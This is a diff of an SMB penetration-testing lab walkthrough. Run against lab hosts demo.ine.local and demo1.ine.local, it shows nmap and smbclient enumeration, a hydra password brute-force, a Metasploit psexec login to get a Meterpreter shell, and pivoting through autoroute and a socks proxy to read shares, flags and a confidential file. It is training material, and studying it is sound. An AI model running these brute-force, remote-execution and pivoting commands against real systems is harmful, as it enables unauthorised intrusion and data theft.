@@ -121,126 +121,365 @@ While NetBIOS and SMB were once closely linked, modern networks primarily rely o
 
    *Displays the hosts file to see which names and IP addresses are configured on the system.*
 
-2. **Test Connectivity:**
+ping demo.ine.local
+ping demo1.ine.local
 
-   `ping demo.ine.local`
+Content Image
 
-   *Ping command to test the reachability of the first target.*
+Only one provided machine is reachable, i.e., demo.ine.local, and we also found the target's IP addresses.
 
-3. **Network Scan:**
+Step 3: Check open ports on the demo.ine.local machine.
 
-   `nmap demo.ine.local`
+Command
 
-   *Scan the target machine to identify open ports and services.*
+nmap demo.ine.local
 
-4. **NetBIOS Enumeration:**
+Content Image
 
-   `nbtscan`  
-   `whatis nbtscan`  
-   `nbtscan 10.2.21.216/24`
+Multiple ports are open on the demo.ine.local machine.
 
-   *Use `nbtscan` to identify NetBIOS names in the network.*
+All the ports expose core services of the Windows operating system, i.e., SMB, RDP, RPC, etc.
 
-5. **Resolve NetBIOS Name:**
+In this lab, we will perform attacks on the SMB service.
 
-   `nmblookup -A demo.ine.local`
+    The Server Message Block (SMB) protocol is a network file sharing protocol that allows applications on a computer to read and write to files and to request services from server programs in a computer network. The SMB protocol can be used on top of its TCP/IP protocol or other network protocols. Using the SMB protocol, an application (or the user of an application) can access files or other resources at a remote server. This allows applications to read, create, and update files on the remote server. SMB can also communicate with any server program that is set up to receive an SMB client request. Source: https://docs.microsoft.com/en-us/windows-server/storage/file-server/file-server-smb-overview
 
-   *`nmblookup` resolves the NetBIOS name and returns information about the target machine.*
+By default, the SMB service uses either IP port 139 or 445. Also, it is by default installed and present in every windows operating system. However, we can disable or remove it from the system.
 
-6. **NetBIOS Port Scan:**
+There are multiple versions of the SMB protocol.
 
-   `nmap -sU -p 137 demo.ine.local`
+    SMB1
+    SMB 2.0
+    SMB 2.1
+    SMB 3.0
+    SMB 3.0.2
+    SMB 3.1.1
 
-   *Scan the NetBIOS port to determine if the service is running.*
+SMBv1:
 
-7. **SMB Enumeration:**
+    Server Message Block (SMB) is an application layer network protocol commonly used in Microsoft Windows to provide shared access to files and printers. SMBv1 is the original protocol developed in the 1980s, making it more than 30 years old. More secure and efficient versions of SMB are available today. The SMBv1 protocol is not safe to use. By using this old protocol, you lose protections such as pre-authentication integrity, secure dialect negotiation, encryption, disabling insecure guest logins, and improved message signing. Microsoft has advised customers to stop using SMBv1 because it is extremely vulnerable and full of known exploits. WannaCry, a well-known ransomware attack, exploited vulnerabilities in the SMBv1 protocol to infect other systems. Because of the security risks, support for SMBv1 has been disabled. Source: https://kb.iu.edu/d/aumn
 
-   `nmap -sV -p 139,445 demo.ine.local`
+SMBv1 is used in the old Windows operating system. However, it is still present in the latest Windows OS too. We can disable/enable all SMB versions by modifying the windows registries.
 
-   *Scan the SMB ports (139, 445) to find out which SMB versions are supported on the system.*
+SMBv1 onwards, all the versions are reasonability secure. They provide many security protections, i.e., disabling insecure guest logins, pre-authentication integrity, secure dialect negotiation, encryption, etc.
 
-8. **Identify SMB Versions:**
+While scanning using nmap, we discovered the SMB service port 445.
 
-   `nmap -p 445 --script smb-protocols demo.ine.local`
+To learn more about all protocol versions and changes. Please refer to the following link: https://en.wikipedia.org/wiki/Server_Message_Block
 
-   *Identify the SMB versions supported on the target system.*
+Now, let's perform enumeration and exploitation of the SMB protocol.
 
-9. **Check SMB Security Mode:**
+Step 4: Let's run nmap on port 445 to get more information about the protocol.
 
-   `nmap -p 445 --script smb-security-mode demo.ine.local`
+Command
 
-   *Check the security mode of SMB to identify potential vulnerabilities.*
+nmap -sV -p 139,445 demo.ine.local
 
-10. **Use SMB Client:**
+-sV: Probe open ports to determine service/version info
 
-    `smbclient -L demo.ine.local`
+-p 139,445: Only scan specified ports
 
-    *Attempt an anonymous login to the SMB service to browse shared resources.*
+Content Image
 
-11. **User Enumeration:**
+We have received information about both the ports. Also, identified that the target is Microsoft Windows Server 2008 R2 - 2012
 
-    `nmap -p 445 --script smb-enum-users.nse demo.ine.local`
+Step 5: Now, let's identify all the supported SMB versions on the target machine.
 
-    *Enumerate users available on the SMB service.*
+We can quickly identify it using the nmap script smb-protocols.
 
-12. **Brute-Force SMB:**
+Command
 
-    `vim users.txt`
+nmap -p445 --script smb-protocols demo.ine.local
 
-    *Create a `users.txt` file with usernames for brute-force attacks.*
+-p445: Only scan specified port.
 
-    `hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb`
+--script smb-protocols: Script Scan
 
-    *Run `Hydra` to brute-force the SMB login using a wordlist.*
+Content Image
 
-13. **Gain SMB Access:**
+We can notice that all three versions are accessible.
 
-    `psexec.py administrator@demo.ine.local`
+There is one more interesting nmap script for the smb protocol to find the security level of the protocol.
 
-    *Use `psexec` to obtain a shell on the target system.*
+Step 6: Let's run the nmap script to find the smb protocol security level.
 
-14. **Start a Meterpreter Session:**
+Command
 
-    `start msfconsole -q`  
-    `search psexec`  
-    `use [module]`  
-    `set payload windows/x64/meterpreter/reverse_tcp`  
-    `set rhosts demo.ine.local`  
-    `set SMBuser Administrator`  
-    `set SMBPass password1`  
-    `exploit`
+nmap -p445 --script smb-security-mode demo.ine.local
 
-    *Use Metasploit to start a Meterpreter session on the target system.*
+Content Image
 
-15. **Attack the Second System:**
+We have tried to access the target SMB server using a guest user. We have received SMB security level information.
 
-    `meterpreter:shell`  
-    `meterpreter:ping demo1.ine.local`  
-    `meterpreter:run autoroute -s demo.ine.local/20`  
-    `meterpreter:background`
+We can find more information from the following link: https://nmap.org/nsedoc/scripts/smb-security-mode.html
 
-    *Use the current session to scan and exploit the second target system.*
+This clarifies that the nmap script uses the guest user for all the smb script scan. We can define another user also. But, we need valid credentials to access the target machine.
 
-16. **Use Proxychains:**
+The guest user is the default user available on all the windows operating systems.
 
-    `cat /etc/proxychains4.conf`
+If an attacker has valid credentials on the target machine. Then, command execution is possible. It depends on the user privilege.
 
-    *Configure Proxychains to connect to the second target system via the first target.*
+Now, let's find that we have the Null Session, i.e Anonymous access on the target machine using the smbclient tool.
 
-    `metasploit psexec: search socks`  
-    `use 0`  
-    `show options`  
-    `set version 4a`  
-    `set SRVPORT 9050`  
-    `exploit`  
-    `proxychains nmap demo1.ine.local -T4 -Pn -sV -p 445`
+smbclient
 
-    *Use `Proxychains` to access and scan the second target through the first.*
+    smbclient is a client that can 'talk' to an SMB/CIFS server. It offers an interface similar to that of the ftp program. Operations include things like getting files from the server to the local machine, putting files from the local machine to the server, retrieving directory information from the server and so on. Step 7: Let's run the smbclient tool to find that we have anonymous access on the target machine.
 
-17. **Mount Shared Drives:**
+Commands
 
-    `net use D: \\[Demo1]\Documents`  
-    `net use K: \\[Demo1]\K$`  
-    `dir K:\`
+smbclient -L  demo.ine.local
+Enter WORKGROUP\root's password: <enter>
 
-    *Mount shared drives from the second target system onto the first to access files.*
+Content Image
+
+We can access the target using anonymous login.
+
+Step 8: Now, we have anonymous access to the target machine. We can smoothly dump all the present windows users using the nmap script.
+
+Let's find all the present users using nmap smb-enum-users script.
+
+Command
+
+nmap -p445 --script smb-enum-users.nse  demo.ine.local
+
+Content Image
+
+There are a total of four users present. admin, administrator, root, and guest
+
+The guest and administrator users are built-in accounts.
+
+Now, let's find the valid password for admin, administrator, and root user.
+
+Step 9: First, let's create a file (users.txt) and keep all these users
+
+Content Image
+
+Now, let's run the hydra tool for brute-forcing the SMB protocol to find the valid password of the provided users.
+
+Command
+
+hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
+
+-L: List of users
+
+-P: Password list
+
+demo.ine.local smb: Target Address and Target Protocol
+
+Content Image
+
+We have successfully retrieved valid passwords for all three users.
+
+Step 10: Now, we can use the Metasploit framework and run the psexec exploit module to gain the meterpreter shell using the administrator user valid password.
+
+Microsoft Windows Authenticated User Code Execution
+
+    This module uses a valid administrator username and password (or password hash) to execute an arbitrary payload. This module is similar to the "psexec" utility provided by SysInternals. This module is now able to clean up after itself. The service created by this tool uses a randomly chosen name and description. Source: https://www.rapid7.com/db/modules/exploit/windows/smb/psexec/
+
+Let's start the Metasploit framework and exploit it!
+
+Commands
+
+Note: If the exploit won't give you a meterpreter session. Try again!
+
+msfconsole -q
+use exploit/windows/smb/psexec
+set RHOSTS demo.ine.local
+set SMBUser administrator
+set SMBPass password1
+exploit
+
+Content Image
+
+Success!. We have received a meterpreter session.
+
+Step 11: Now, we will discover target machine information, e.g., current user, system information, arch, etc.
+
+Commands
+
+getuid
+sysinfo
+
+Content Image
+
+We notice that target is running a windows server, and we have received a meterpreter session with "SYSTEM" (or "NT Authority") privileges on the machine.
+
+Step 12: Let's read the flag.
+
+Command
+
+cat C:\\Users\\Administrator\\Documents\\FLAG1.txt
+
+Content Image
+
+We have found the FLAG1: 8de67f44f49264e6c99e8a8f5f17110c
+
+Step 13: Let's check if we can access demo1.ine.local from the compromised host.
+
+Before, ping to the second target machine from the compromised host. We need to know the IP address for the demo1.ine.local host.
+
+Remember, when we did ping to both the targets and discovered IP addresses of these target machines:
+
+1. demo.ine.local: 10.0.17.62
+
+2. demo1.ine.local : 10.0.22.69
+
+Now, let's ping to the 10.0.22.69 and verify that it is reachable from the second machine.
+
+Commands
+
+shell
+ping 10.0.22.69
+
+Content Image
+
+We can access the demo1.ine.local machine, i.e., 10.0.22.69.
+
+However, we cannot access that machine (10.0.22.69) from the Kali machine. So, here we need to perform pivoting by adding route from the Metasploit framework.
+
+Step 14: Let's add the route using the meterpreter session and identify the second machine service.
+
+Commands
+
+CTRL + C
+y
+run autoroute -s 10.0.22.69/20
+
+Content Image
+
+We have successfully added the route to access the demo1.ine.local machine.
+
+Step 15: Now, let's start the socks proxy server to access the pivot system on the attacker's machine using the proxychains tool.
+
+First start the socks4a server using the Metasploit module.
+
+Socks4a Proxy Server
+
+    This module provides a socks4a proxy server with built-in Metasploit routing to relay connections. Source:: https://www.rapid7.com/db/modules/auxiliary/server/socks4a/
+
+Note: The proxychains should have configured with the following parameters (at the end of /etc/proxychains4.conf):
+
+Command
+
+cat /etc/proxychains4.conf
+
+Content Image
+
+We can notice, socks4 port is 9050.
+
+Now, let's run the Metasploit socks proxy auxiliary server module on port 9050.
+
+Commands
+
+background
+use auxiliary/server/socks_proxy
+show options
+
+Content Image
+
+We notice that SRVPORT is 1080, and VERSION is 5 mentioned in the module options. But, we need to set the port to 9050 and the version to 4a. Let's change both the values then run the server.
+
+Commands:
+
+set SRVPORT 9050
+set VERSION 4a 
+exploit
+jobs
+
+Content Image
+
+We can notice that the server is running perfectly.
+
+Step 16: Now, let's run nmap with proxychains to identify SMB port (445) on the pivot machine, i.e. demo1.ine.local
+
+We could also specify multiple ports. But, in this case, we are only interested in SMB service.
+
+Command:
+
+proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
+
+demo1.ine.local
+: The pivot machine
+
+-sT : TCP connect scan
+
+-Pn : Skip host discovery and force port scan.
+
+-sV : Probe open ports to determine service/version info
+
+-p 445 : Define port to scan
+
+This scan is the safest way to identify the open ports. We could use an auxiliary TCP port scanning module. But those are very aggressive and can kill your session.
+
+Content Image
+
+We notice that port 445 is open on the target machine.
+
+Step 17: Now, let's use the net view command to find all resources shared by the demo1.ine.local machine.
+
+Interact with the meterpreter session again.
+
+Commands:
+
+sessions -i 1
+shell
+net view 10.0.22.69
+
+Content Image
+]
+
+We have received the Access is denied. message.
+
+Well, currently, we are running as NT AUTHORITY\SYSTEM privilege. Let's migrate the process into explorer.exe and reaccess it.
+
+Commands:
+
+CTRL + C
+migrate -N explorer.exe
+shell
+net view 10.0.22.69
+
+Content Image
+
+This time we can see two shared resources. Documents and K drive. And, this confirms that pivot target (demo1.ine.local) allows Null Sessions, so we can access the shared resources. Also, we can achieve the same goal in several ways.
+
+Step 18: Now, we can map the shared drive to the demo.ine.local machine using the' net' command.
+
+Let's map the shared resources, i.e., the Documents and K drive.
+
+Commands:
+
+net use D: \\10.0.22.69\Documents
+net use K: \\10.0.22.69\K$
+
+Content Image
+
+We successfully mapped the resources to D and K drives.
+
+Step 19: Let's check what is inside these mapped drives.
+
+Commands:
+
+dir D:
+dir K:
+
+Content Image
+
+Now that we can browse the shares content, we can download or read it on the attacker's machine.
+
+Let's read the FLAG2 and Confidential.txt files.
+
+Commands:
+
+CTRL + C
+cat D:\\Confidential.txt
+cat D:\\FLAG2.txt
+
+Content Image
+
+Content Image
+]
+
+We have found the FLAG2: c8f58de67f44f49264e6c99e8f17110c
+
+This file is the ultimate proof for the client. The organization files are not safe. Therefore, policies and proper configurations should be implemented inside and outside the perimeter.
